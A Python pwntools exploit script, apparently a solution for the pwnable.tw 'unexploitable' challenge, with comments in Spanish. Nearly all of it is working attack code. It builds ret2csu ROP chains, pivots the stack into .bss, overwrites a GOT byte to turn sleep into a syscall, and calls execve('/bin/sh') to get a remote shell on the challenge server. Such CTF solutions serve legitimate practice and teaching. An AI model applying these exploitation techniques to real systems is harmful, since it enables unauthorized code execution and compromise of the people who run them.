#!/usr/bin/env python
# coding=utf8

from pwn import *
#context.log_level = 'debug'
context.terminal = ['gnome-terminal','-x','bash','-c']

#cn = process('./unexploitable', env={'LD_PRELOAD':'./libc_64.so.6'})
libc=ELF('./libc_64.so.6')
cn = remote('chall.pwnable.tw', 10403)

# modificamos reloc_sleep y lo convertimos en syscall sumandole al lsb de reloc_sleep un offset para llegar al syscall de sleep que esta en el byte \xde
# modificamos valor de stack, lo llevamos a bss y trabajamos desde alli
# para conseguir el valor de syscall deseado se usa el return de read, rax = caracteres leidos.


EXECUTABLE = './unexploitable'
elf = ELF(EXECUTABLE)

bss_start       = 0x601028+0x200 # writable zone 
reloc_read      = 0x601000 
reloc_sleep     = 0x601010
sym_read        = 0x400430
sym_sleep       = 0x400450
poprbxrbp       = 0x400653
dececx          = 0x400575
poprbp          = 0x400512
leave_ret       = 0x400576
jmprax          = 0x40053e
main            = 0x40055B
syscall         = 0x400571 # una vez que hallamos modificado byte en relod_read
void            = 0xddeadbefddeadbef
part1           = 0x4005e6 # mov rbx, qword [rsp + 8];mov rbp, qword [rsp + 0x10];mov r12, qword [rsp + 0x18];mov r13, qword [rsp + 0x20];mov r14, qword [rsp + 0x28];mov r15, qword [rsp + 0x30]
part2           = 0x4005d0 # mov rdx, r15;mov rsi, r14;mov edi, r13d;call qword [r12 + rbx*8] 


def call_function(call_addr, arg1, arg2, arg3):
    payload=""
    payload += p64(part1)
    payload += "A"*8
    payload += p64(0)           # RBX
    payload += p64(1)           # RBP   
    payload += p64(call_addr)   # R12 -> RIP
    payload += p64(arg1)        # R13 -> RDI
    payload += p64(arg2)        # R14 -> RSI
    payload += p64(arg3)        # R15 -> RDX
    payload += p64(part2)
    payload += "Z"*0x38
    return payload
# Wait for debugger
#pid = util.proc.pidof(cn)[0]
#print "The pid is: "+str(pid)
#util.proc.wait_for_debugger(pid)


#this in stack
payload = "A"*0x10
payload += "C"*8 
payload += call_function(elf.got["read"],0,bss_start,0x200)
payload += p64(poprbp)
payload += p64(bss_start)
payload += p64(leave_ret)

#this is bss=stack
payload2 =  p64(0x9999999999999999)
payload2 += call_function(elf.got["read"],0,reloc_sleep,1)      # read 1 char and change sleep func to syscall
payload2 += call_function(elf.got["read"],0,bss_start,0x200)    # read another payload
payload2 += call_function(elf.got["read"],0,bss_start+0x200,59) # prepare syscall 59 = execve
payload2 += p64(poprbp)
payload2 += p64(bss_start)
payload2 += p64(leave_ret)



cn.sendline(payload)
print("sending payload 1/4....")
sleep(3)
cn.sendline(payload2)
sleep(3)
print("sending payload 2/4....")
cn.send("\xde")


payload3 =  "/bin/sh\x00".ljust(0x08,'A')
payload3 += call_function(elf.got["sleep"],bss_start,bss_start+0x88,0x0)
payload3 += p64(bss_start)
payload3 += p64(0x0000000000000000)
print("sending payload 3/4....")
sleep(3)
cn.sendline(payload3)

print("sending payload 4/4....")
sleep(3)
cn.send("A"*59)
print("done")
cn.interactive()



